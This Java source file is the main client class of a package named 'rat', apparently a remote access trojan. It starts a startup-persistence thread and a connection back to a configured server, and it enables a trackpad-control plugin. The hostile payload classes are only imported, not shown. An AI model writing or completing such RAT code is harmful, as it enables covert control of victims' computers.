package rat;

import rat.network.ClientConnection;
import rat.persistence.Startup;
import rat.plugins.Plugin;
import rat.plugins.brightness.BrightnessPlugin;
import rat.plugins.trackpad.TrackpadPlugin;
import rat.plugins.wifi.WiFiPlugin;

import java.util.ArrayList;
import java.util.List;

public class Client
{
    private String address;
    private int port;

    private List<Plugin> pluginsEnabled = new ArrayList<>();

    public Client(String address, int port)
    {
        this.address = address;
        this.port = port;
        setup();
        start();
    }

    public void setup()
    {
        //pluginsEnabled.add(new BrightnessPlugin(1, 10000));
        //pluginsEnabled.add(new WiFiPlugin(10000));
        pluginsEnabled.add(new TrackpadPlugin());

        new Thread(new Startup("startup")).start();

        new Thread(new ClientConnection(this)).start();
    }

    public void start()
    {

        for (Plugin plugin : pluginsEnabled)
        {
            System.out.println("test");
            //new Thread(plugin).start();
        }
    }

    public String getAddress()
    {
        return address;
    }

    public int getPort()
    {
        return port;
    }
}
